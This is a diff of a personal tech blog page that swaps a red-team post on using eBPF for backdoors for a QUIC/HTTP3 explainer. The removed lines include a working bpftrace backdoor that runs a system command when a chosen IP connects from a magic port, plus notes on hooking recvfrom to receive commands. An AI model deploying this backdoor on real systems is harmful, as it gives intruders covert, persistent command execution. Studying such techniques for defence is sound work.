@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>offensive eBPF——使用BPF后门、修改文件、隐藏进程 – ruokeqx&#39;s blog</title>
+    <title>浅尝QUIC和HTTP3 – ruokeqx&#39;s blog</title>
     
 
 
@@ -653,7 +653,7 @@
     
     var baseurl = JSON.parse("\"https://ruokeqx.gitee.io\"");
     
-    var permalink = JSON.parse("\"https://ruokeqx.gitee.io/posts/offensive_bpf/\"");
+    var permalink = JSON.parse("\"https://ruokeqx.gitee.io/posts/quichttp3_demo/\"");
     
     var langprefix = JSON.parse("\"\"");
     var searchResults = null;
@@ -1334,18 +1334,18 @@
 <meta name="description" content="" />
 
 
-<meta name="keywords" content="bpf,red team">
+<meta name="keywords" content="network">
 
-<meta name="created" content="2022-06-24T00:00:00&#43;0000">
-<meta name="modified" content="2022-06-24T00:00:00&#43;0000">
-<meta property="article:published_time" content="2022-06-24T00:00:00&#43;0000">
+<meta name="created" content="2022-07-09T00:00:00&#43;0000">
+<meta name="modified" content="2022-07-09T00:00:00&#43;0000">
+<meta property="article:published_time" content="2022-07-09T00:00:00&#43;0000">
 
 <meta name="author" content="ruokeqx">
 
 
 <meta property="og:site_name" content="ruokeqx&#39;s blog">
-<meta property="og:title" content="offensive eBPF——使用BPF后门、修改文件、隐藏进程">
-<meta property="og:url" content="https://ruokeqx.gitee.io/posts/offensive_bpf/">
+<meta property="og:title" content="浅尝QUIC和HTTP3">
+<meta property="og:url" content="https://ruokeqx.gitee.io/posts/quichttp3_demo/">
 <meta property="og:type" content="article">
 <meta property="og:description" content="">
 
@@ -1358,7 +1358,7 @@
 
 <meta name="apple-mobile-web-app-status-bar-style" content="#fff">
 
-<link rel="canonical" href="https://ruokeqx.gitee.io/posts/offensive_bpf/">
+<link rel="canonical" href="https://ruokeqx.gitee.io/posts/quichttp3_demo/">
 
 <link rel="manifest" href="/manifest.json">
 
@@ -1372,12 +1372,12 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "offensive eBPF——使用BPF后门、修改文件、隐藏进程",
-    "datePublished": "2022-06-24T00:00:00Z",
-    "dateModified": "2022-06-24T00:00:00Z",
-    "url" : "https://ruokeqx.gitee.io/posts/offensive_bpf/",
-    "description": "BPF综述 BPF功能 BPF核心用例是tracing, observability, perfomance measuring and security tooling. 许多最新的检测、监控软件和性能跟踪工具都是用BPF编写的，尤其是云原生时代（",
-    "keywords": ["bpf","red team"],
+    "headline": "浅尝QUIC和HTTP3",
+    "datePublished": "2022-07-09T00:00:00Z",
+    "dateModified": "2022-07-09T00:00:00Z",
+    "url" : "https://ruokeqx.gitee.io/posts/quichttp3_demo/",
+    "description": "HTTP概述 HTTP是互联网的基石，它的简单、灵活使得各种各样的互联网应用成为可能。但HTTP的一些先天不足也为应用的开发增加了难度，为此，",
+    "keywords": ["network"],
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https://ruokeqx.gitee.io"
@@ -1669,7 +1669,7 @@
   
   <li  class="is-active" >
     
-      <span>offensive eBPF——使用BPF后门、修改文件、隐藏进程</span>
+      <span>浅尝QUIC和HTTP3</span>
     
   </li>
   
@@ -1681,14 +1681,14 @@
   <div class="single ">
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
-    <h2 class="single__title" data-ani="true">offensive eBPF——使用BPF后门、修改文件、隐藏进程</h2>
+    <h2 class="single__title" data-ani="true">浅尝QUIC和HTTP3</h2>
     <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
 <div class="single__infos">
-  <time class="single__info" title="Written At">📅&nbsp;Jun 24, 2022 </time>
+  <time class="single__info" title="Written At">📅&nbsp;Jul 9, 2022 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;12&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;5&nbsp;min read </span>
   
   <span class="single__info">
      &middot; 👀<span id="busuanzi_value_page_pv">...</span> views
@@ -1701,330 +1701,34 @@
   🏷️
   
 
-  <li><a href="https://ruokeqx.gitee.io/tags/bpf/" class="single__tag" title="bpf">#bpf</a></li>
-
-  <li><a href="https://ruokeqx.gitee.io/tags/red-team/" class="single__tag" title="red team">#red team</a></li>
+  <li><a href="https://ruokeqx.gitee.io/tags/network/" class="single__tag" title="network">#network</a></li>
 
 </ul>
 
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <h2 id="bpf综述">BPF综述</h2>
-<h3 id="bpf功能">BPF功能</h3>
-<p>BPF核心用例是tracing, observability, perfomance measuring and security tooling.</p>
-<p>许多最新的检测、监控软件和性能跟踪工具都是用BPF编写的，尤其是云原生时代（Cilium）</p>
-<h3 id="加载bpf程序">加载BPF程序</h3>
-<p>加载BPF程序需要root或者CAP_BPF权限</p>
-<p>非特权用户只能调用<code>BPF_PROG_TYPE_SOCKET_FILTER</code>和<code>BPF_PROG_TYPE_CGROUP_SKB</code></p>
-<p><code>cat /proc/sys/kernel/unprivileged_bpf_disabled</code>查看权限</p>
-<p><code>sysctl kernel.unprivileged_bpf_disabled=1</code></p>
-<ul>
-<li>值为0表示允许非特权用户调用bpf；</li>
-<li>值为1表示禁止非特权用户调用bpf且该值不可再修改，只能重启后修改；</li>
-<li>值为2表示禁止非特权用户调用bpf，可以再次修改为0或1。</li>
-</ul>
-<p>加载过程如下：</p>
-<ul>
-<li>Load:用户态程序使用BPF_PROG_LOAD参数调用bpf()来加载程序</li>
-<li>Config:用户态程序将BPF程序和事件联系起来。例如通过ioctl()调用(例如PERF_EVENT_IOC_SET_BPF)。</li>
-</ul>
-<p>BPF程序是非持久性的 所以系统重启了也需要重启</p>
-<h3 id="bpf安全相关">BPF安全相关</h3>
-<ul>
-<li>hook系统调用和用户函数</li>
-<li>操作用户数据结构</li>
-<li>复写系统调用返回值</li>
-<li>调用system()创建新进程</li>
-<li>挂在BPF程序到物理设备上 如网卡</li>
-<li>新的供应链攻击面</li>
-<li>将安全和检测工具混合</li>
-<li>一些BPF作为rootkit，一些用来容器逃逸</li>
-</ul>
-<h3 id="btf">BTF</h3>
-<p><a href="https://www.kernel.org/doc/html/latest/bpf/btf.html">BTF</a> 是 BPF CO-RE 的核心之一， 它是是一种与 DWARF 类似的调试信息，但</p>
-<ul>
-<li>更通用、表达更丰富，用于描述 C 程序的所有类型信息。</li>
-<li>更简单，空间效率更高（使用 <a href="https://facebookmicrosites.github.io/bpf/blog/2018/11/14/btf-enhancement.html">BTF 去重算法</a>）， 占用空间比 DWARF 低 100x。</li>
-</ul>
-<p>如今，让 Linux 内核在运行时（runtime）一直携带 BTF 信息是可行的， 只需在编译时指定 <code>CONFIG_DEBUG_INFO_BTF=y</code>。内核的 BTF 除了被内核自身使用， 现在还用于增强 BPF 校验器自身的能力 —— 某些能力甚至超越了一年之前我们的想象力所及（例如，已经有了直接读取内核内存的能力，不再需要通过 <code>bpf_probe_read()</code> 间接读取了）。</p>
-<p>更重要的是，内核已经将这个自描述的权威 BTF 信息（定义结构体的精确内存布局等信息） 通过 sysfs 暴露出来，在 <code>/sys/kernel/btf/vmlinux</code>。 下面的命令将生成一个与所有内核类型兼容的 C 头文件（通常称为 “vmlinux.h”）：</p>
-<pre tabindex="0"><code>$ bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h
-</code></pre><p>这里说的”所有“真的是“所有”：包括那些并未通过 kernel-devel package 导出的类型！</p>
-<p>有了 <code>vmlinux.h</code>，就无需再像通常的 BPF 程序那样 <code>#include &lt;linux/sched.h&gt;</code>、<code>#include &lt;linux/fs.h&gt;</code> 等等头文件， 现在只需要 <code>#include &quot;vmlinux.h&quot;</code>，也不用再安装 kernel-devel 了。</p>
-<p>不幸的是，BPF（以及 DWARF）并不记录 <code>#define</code> 宏，因此某些常用 的宏可能在 vmlinux.h 中是缺失的。但这些没有记录的宏中 ，最常见的一些已经在 <a href="https://github.com/libbpf/libbpf/blob/master/src/bpf_helpers.h">bpf_helpers.h</a> （libbpf 提供的内核侧”库“）提供了。</p>
-<h3 id="xdp">XDP</h3>
-<p>XDP全称为eXpress Data Path，是Linux内核网络栈的最底层。它只存在于RX路径上，允许在网络设备驱动内部网络堆栈中数据来源最早的地方进行数据包处理，在特定模式下可以在操作系统分配内存（skb）之前就已经完成处理。</p>
-<p>XDP暴露了一个可以加载BPF程序的网络钩子。在这个钩子中，程序能够对传入的数据包进行任意修改和快速决策，避免了内核内部处理带来的额外开销。这使得XDP在性能速度方面成为最佳钩子，例如缓解DDoS攻击等，相关背景知识可以看<a href="https://davidlovezoe.club/ebpf-learning-xdp-init-intro">这篇文章</a>。</p>
-<p>XDP暴露的钩子具有特定的输入上下文，它是单一输入参数。它的类型为 struct xdp_md，在内核头文件bpf.h 中定义，具体字段如下所示：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* user accessible metadata for XDP packet hook
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * new fields must be added to the end of this structure
-</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
-</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">xdp_md</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">data</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">data_end</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">data_meta</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="cm">/* Below access go through struct xdp_rxq_info */</span>
-</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">ingress_ifindex</span><span class="p">;</span> <span class="cm">/* rxq-&gt;dev-&gt;ifindex */</span>
-</span></span><span class="line"><span class="cl">	<span class="n">__u32</span> <span class="n">rx_queue_index</span><span class="p">;</span>  <span class="cm">/* rxq-&gt;queue_index  */</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>程序执行时，data和data_end字段分别是数据包开始和结束的指针，它们是用来获取和解析传来的数据，第三个值是data_meta指针，初始阶段它是一个空闲的内存地址，供XDP程序与其他层交换数据包元数据时使用。最后两个字段分别是接收数据包的接口和对应的RX队列的索引。当访问这两个值时，BPF代码会在内核内部重写，以访问实际持有这些值的内核结构struct xdp_rxq_info。</p>
-<p>在处理完一个数据包后，XDP程序会返回一个动作（Action）作为输出，它代表了程序退出后对数据包应该做什么样的最终裁决，也是在内核头文件bpf.h 定义了以下5种动作类型：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">enum</span> <span class="n">xdp_action</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="n">XDP_ABORTED</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="c1">// Drop packet while raising an exception
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_DROP</span><span class="p">,</span> <span class="c1">// Drop packet silently
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_PASS</span><span class="p">,</span> <span class="c1">// Allow further processing by the kernel stack
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_TX</span><span class="p">,</span> <span class="c1">// Transmit from the interface it came from
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">XDP_REDIRECT</span><span class="p">,</span> <span class="c1">// Transmit packet from another interface
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/images/posts/offensive_bpf/image-20220621155731752.png" alt="image-20220621155731752" /></p>
-<h3 id="libbpf--libbpf-bootstrap">libbpf &amp;&amp; libbpf-bootstrap</h3>
-<p>libbpf是为快速构建bpf程序的一个库，与bcc类似，需要编写bpf程序和一个装载程序，对于编写tracepoint、kprobe、uprobe等来说比较便捷。</p>
-<p>bpf编写的xdp程序可以直接用命令挂在到网卡 不一定需要装载器，其中libbpf-boorstrap只提供了rust的写法（对于没有学过rust的同学不太友好），直接硬搬c写法的话是装载不上的。</p>
-<p>libbpf or libbpf-bootstrap的写法中常出现SEC(&ldquo;tracepoint/&hellip;&quot;)的写法，这只是代码段的命名，对于tracepoint、uprobe等会根据其挂在到对应的点上。但是对于SEC(&ldquo;xdp/.&quot;)，直接照抄libbpf-bootstrap的c写法会报错，可以采用编译后手动挂载的方法，如果会rust也可以参考库中rust写法，也可以参照<a href="https://github.com/xdp-project/xdp-tutorial">xdp-tutorial</a>的写法。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">clang -O2 -target bpf -c xdp-drop.c -o xdp-drop.o -I /usr/include/x86_64-linux-gnu
-</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev docker0 xdp obj xdp-drop.o sec xdp verbose
-</span></span><span class="line"><span class="cl">sudo ip link list
-</span></span><span class="line"><span class="cl">docker run -d -p 80:80 nginx
-</span></span><span class="line"><span class="cl">curl 127.0.0.1
-</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev docker0 xdp off
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="bpftrace-backdoor">bpftrace backdoor</h2>
-<h3 id="validator">Validator</h3>
-<p>假设用户已经获取一个root shell，希望用bpf搭建隐藏性更好的后门。</p>
-<p>可以使用远程IP地址和TCP连接的源端口号的组合来触发BPF程序。</p>
-<p>要注意的是网络是大端传输，所以我们从结构体中取出的ip地址数是ip地址的大端数 具体可转化为hex然后倒序</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;&gt;&gt; hex<span class="o">(</span>2156439744<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;0x8088a8c0&#39;</span>
-</span></span><span class="line"><span class="cl">&gt;&gt;&gt; 0xc0
-</span></span><span class="line"><span class="cl"><span class="m">192</span>
-</span></span><span class="line"><span class="cl">&gt;&gt;&gt; 0xa8
-</span></span><span class="line"><span class="cl"><span class="m">168</span>
-</span></span><span class="line"><span class="cl">&gt;&gt;&gt; 0x88
-</span></span><span class="line"><span class="cl"><span class="m">136</span>
-</span></span><span class="line"><span class="cl">&gt;&gt;&gt; 0x80
-</span></span><span class="line"><span class="cl"><span class="m">128</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>以下是最简单的触发器 如果来源IP和端口满足条件就执行某系统命令（此处是直接照抄ref的实现 做完后回头看来是十分不成熟的写法）</p>
-<p>include/net/sock.h</p>
-<pre tabindex="0"><code class="language-bpftrace" data-lang="bpftrace">#include &lt;net/sock.h&gt;
-
-BEGIN
-{
-  printf(&#34;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&#34;);
-  printf(&#34;Allowed IP: %u (=&gt; %s). Magic Port: %u\n&#34;, $1, ntop(AF_INET, $1), $2);
-}
-
-kretprobe:inet_csk_accept
-{
-  $sk = (struct sock *) retval;
-
-  // only supporting IPv4
-  if ( $sk-&gt;__sk_common.skc_family == AF_INET )
-  {
-    printf(&#34;-&gt;%s: Checking RemoteAddr... %s (%u).\n&#34;, 
-      func,
-      ntop($sk-&gt;__sk_common.skc_daddr),
-      $sk-&gt;__sk_common.skc_daddr);
-    //is IP allowed?
-    if ($sk-&gt;__sk_common.skc_daddr == (uint32)$1)
-    {
-      printf(&#34;-&gt;%s: IP check passed.\n&#34;, func);
-      $src_port_tmp = (uint16) $sk-&gt;__sk_common.skc_dport;
-      $src_port     = (( $src_port_tmp  &gt;&gt; 8) | (( $src_port_tmp &lt;&lt; 8) &amp; 0x00FF00));
-
-      printf(&#34;-&gt;%s: Checking port: %d...\n&#34;, func, $src_port);
-
-      if ($src_port == (uint16) $2)
-      {
-        printf(&#34;-&gt;%s: Magic port check passed.\n&#34;, func); 
-        system(&#34;whoami &gt;&gt; /proc/1/root/tmp/o&#34;);
-        printf(&#34;-&gt;%s: Command executed.\n&#34;, func);
-      }
-      else
-      {
-        printf(&#34;-&gt;%s: Magic port check FAILED.\n&#34;, func);
-      }
-    }
-  }
-}
-</code></pre><p><img src="/images/posts/offensive_bpf/image-20220617012407517.png" alt="image-20220617012407517" /></p>
-<h3 id="backdoor">Backdoor</h3>
-<p>完成了验证之后就是获取并执行用户传入的命令</p>
-<p>可以hook sys_enter_read 但是还没有填充数据，sys_exit_read填充完数据但是sys_exit_read并不能访问到buf参数。</p>
-<p>所以可以在 sys_enter_read 内部时将指针存储在 BPF 映射中，然后在 sys_exit_read 中读取和使用该指针来解决的。</p>
-<p>当然需要暴露在公网的服务来传数据  如上面使用nginx开了个web服务</p>
-<p>对于 OpenSSH，要hook用户空间。 SSH 服务器只通过 read() 读取单个字节，这使得使用 bpftrace 解析和连接字节或遍历正确的结构有点麻烦。</p>
-<p>starce查看nginx获取系统调用信息的 发现使用的是recvfrom系统调用</p>
-<p>PS:可以直接在此处看到函数参数 （刚开始一直疯狂解析像个傻逼）</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  bpfbackdoor sudo strace -p <span class="m">14911</span>
-</span></span><span class="line"><span class="cl">strace: Process <span class="m">14911</span> attached
-</span></span><span class="line"><span class="cl">epoll_wait<span class="o">(</span>10, <span class="o">[{</span><span class="nv">events</span><span class="o">=</span>EPOLLIN, <span class="nv">data</span><span class="o">={</span><span class="nv">u32</span><span class="o">=</span>2632245264, <span class="nv">u64</span><span class="o">=</span>140448062824464<span class="o">}}]</span>, 512, -1<span class="o">)</span> <span class="o">=</span> <span class="m">1</span>
-</span></span><span class="line"><span class="cl">accept4<span class="o">(</span>7, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>47722<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&#34;192.168.136.128&#34;</span><span class="o">)}</span>, <span class="o">[</span><span class="nv">112</span> <span class="o">=</span>&gt; 16<span class="o">]</span>, SOCK_NONBLOCK<span class="o">)</span> <span class="o">=</span> <span class="m">23</span>
-</span></span><span class="line"><span class="cl">epoll_ctl<span class="o">(</span>10, EPOLL_CTL_ADD, 23, <span class="o">{</span><span class="nv">events</span><span class="o">=</span>EPOLLIN<span class="p">|</span>EPOLLRDHUP<span class="p">|</span>EPOLLET, <span class="nv">data</span><span class="o">={</span><span class="nv">u32</span><span class="o">=</span>2632245985, <span class="nv">u64</span><span class="o">=</span>140448062825185<span class="o">}})</span> <span class="o">=</span> <span class="m">0</span>
-</span></span><span class="line"><span class="cl">epoll_wait<span class="o">(</span>10, <span class="o">[{</span><span class="nv">events</span><span class="o">=</span>EPOLLIN, <span class="nv">data</span><span class="o">={</span><span class="nv">u32</span><span class="o">=</span>2632245985, <span class="nv">u64</span><span class="o">=</span>140448062825185<span class="o">}}]</span>, 512, 60000<span class="o">)</span> <span class="o">=</span> <span class="m">1</span>
-</span></span><span class="line"><span class="cl">recvfrom<span class="o">(</span>23, <span class="s2">&#34;GET / HTTP/1.1\r\nHost: 192.168.13&#34;</span>..., 1024, 0, NULL, NULL<span class="o">)</span> <span class="o">=</span> <span class="m">79</span>
-</span></span><span class="line"><span class="cl">stat<span class="o">(</span><span class="s2">&#34;/usr/share/nginx/html/index.html&#34;</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>615, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  bpfbackdoor sudo bpftrace -lv <span class="s1">&#39;tracepoint:*recvfrom*&#39;</span>
-</span></span><span class="line"><span class="cl">tracepoint:syscalls:sys_enter_recvfrom
-</span></span><span class="line"><span class="cl">    int __syscall_nr
-</span></span><span class="line"><span class="cl">    int fd
-</span></span><span class="line"><span class="cl">    void * ubuf
-</span></span><span class="line"><span class="cl">    size_t size
-</span></span><span class="line"><span class="cl">    unsigned int flags
-</span></span><span class="line"><span class="cl">    struct sockaddr * addr
-</span></span><span class="line"><span class="cl">    int * addr_len
-</span></span><span class="line"><span class="cl">tracepoint:syscalls:sys_exit_recvfrom
-</span></span><span class="line"><span class="cl">    int __syscall_nr
-</span></span><span class="line"><span class="cl">    long ret
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>解析recvfrom无法获取地址 所以解析accept</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  bpfbackdoor sudo bpftrace -lv <span class="s1">&#39;tracepoint:syscalls:sys_enter_accept*&#39;</span>
-</span></span><span class="line"><span class="cl">tracepoint:syscalls:sys_enter_accept
-</span></span><span class="line"><span class="cl">    int __syscall_nr
-</span></span><span class="line"><span class="cl">    int fd
-</span></span><span class="line"><span class="cl">    struct sockaddr * upeer_sockaddr
-</span></span><span class="line"><span class="cl">    int * upeer_addrlen
-</span></span><span class="line"><span class="cl">tracepoint:syscalls:sys_enter_accept4
-</span></span><span class="line"><span class="cl">    int __syscall_nr
-</span></span><span class="line"><span class="cl">    int fd
-</span></span><span class="line"><span class="cl">    struct sockaddr * upeer_sockaddr
-</span></span><span class="line"><span class="cl">    int * upeer_addrlen
-</span></span><span class="line"><span class="cl">    int flags
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="小坑">小坑</h4>
-<p>不知道为什么不能这样用 两个地址是一样的</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">printf<span class="o">(</span><span class="s2">&#34;%lld %lld\n&#34;</span>,@sys_read<span class="o">[</span>tid<span class="o">]</span>,@sys_read<span class="o">[</span>tid<span class="o">]</span>+9<span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="m">94836210655648</span> <span class="m">94836210655648</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>命令只有输入的命令 没法拼接</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">printf<span class="o">(</span><span class="s2">&#34;%s %s&#34;</span>, <span class="nv">$cmd</span>, <span class="s2">&#34;&gt; /tmp/o&#34;</span><span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">cat /etc/passwd
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>经过测试是变量不允许改变赋值（如下方代码dport_tmp处不能替换成dport 否则dport还是获取的网络中的大端数 后面修改为小端赋值失败）</p>
-<p>只有printf和system也只有第一个format允许静态数据 后续args需为变量（应该是权限问题）</p>
-<h4 id="最终代码">最终代码</h4>
-<p>最终代码如下，因为要找到sock然后匹配地址 所以不全是tracepoint 用了一个kprobe，不是很优雅</p>
-<p>一个注意点是数组可以嵌套多维，用来表示条件和存储变量比较优雅</p>
-<p>还有一个注意点是各个trace之间的条件关系 否则会输出无关数据或者无法输出需要的数据 因为前面收到的变量记录为指针到下一个trace很可能数据已经被改变</p>
+      <h2 id="http概述">HTTP概述</h2>
+<p>HTTP是互联网的基石，它的简单、灵活使得各种各样的互联网应用成为可能。但HTTP的一些先天不足也为应用的开发增加了难度，为此，业界各大公司和标准化组织一直在对HTTP做各种改进和扩展，包括缓存、Range、长连接、Pipelining，还有基于SSL/TLS的HTTPS。后来Google设计的SPDY协议，在HTTP的基础上实现了多路复用和Header压缩，以进一步改善基于HTTP的传输性能和应用的交互体验。SPDY最终被IETF接受并做为HTTP/2的基础。虽然多路复用提高了数据并发传输的性能，但由于SPDY是基于TCP的，而TCP使用的是统一的流控，还是存在Head-of-line blocking的问题。而且TLS层每次都需要协商密钥，导致连接建立的过程比较复杂且低效，所以就有了QUIC协议的出现。</p>
+<p>为什么使用UDP，想想需求就很简单，需要的是一个比TCP简单但是比UDP功能多的协议，所以只能基于UDP用户态扩展而没法基于TCP精简(因为协议在内核中)。</p>
+<h2 id="http3的优化">HTTP3的优化</h2>
+<p><code>Head-of-line blocking</code></p>
+<p>HOL blocking是当一行数据包被第一个数据包阻塞在队列中时出现的性能限制现象。HTTP/1.1 中的一种 HOL 阻塞形式是当浏览器中允许的并行请求数用完时，后续请求需要等待前一个请求完成；HTTP/2 通过请求复用消除了应用层的 HOL 阻塞，但 HOL 在传输层(TCP)仍然存在；HTTP/3 使用 QUIC 替代 TCP，消除了传输层中的 HOL 阻塞。[1]</p>
+<p><code>0RTT</code></p>
+<p>HTTPS over TCP&amp;TLS建立连接至少需要十个包。HTTP3对此进行改进：首次连接，使用QUIC协议的客户端和服务端要使用1RTT使用DH(Diffie-Hellman)迪菲-赫尔曼算法进行密钥交换；非首次连接，客户端保存config(有失效时间)跳过1RTT实现0RTT业务数据交互。前向安全保证了过去进行的通讯不受密钥在未来暴露的威胁，QUIC通过每次使用临时密码然后销毁的方式实现前向安全，不必担心config泄露。QUIC 像 TLS 1.3 一样允许客户端在连接握手完成之前开始发送 HTTP 请求</p>
+<p><code>FEC</code></p>
+<p>前向纠错（Forward Error Correction），是指通过发送冗余的编码数据，使得接收方当传输过程中出现错误时，接收方能从收到的数据中重建和还原得到正确的原始数据。</p>
+<p>FEC算法有很多种，包括内存中使用的汉明码，磁盘存储系统中常用的Reed-Solomon码，还有移动通信中用到的卷积码、Turbo码、LDPC码等。</p>
+<p>早期QUIC中使用的FEC算法是基于XOR的简单实现，不过IETF的QUIC协议标准中已经没有FEC的踪影，猜测是FEC在QUIC协议的应用场景中难以被高效的使用。</p>
+<p><code>连接迁移</code></p>
+<p>TCP协议使用五元组来表示一条唯一的连接，当我们从4G环境切换到wifi环境时，手机的IP地址就会发生变化，这时必须创建新的TCP连接才能继续传输数据。QUIC协议基于UDP实现摒弃了五元组的概念，使用64位的随机数作为连接的ID，并使用该ID表示连接。基于QUIC协议之下，我们在日常wifi和4G切换时，或者不同基站之间切换都不会重连，从而提高业务层的体验。</p>
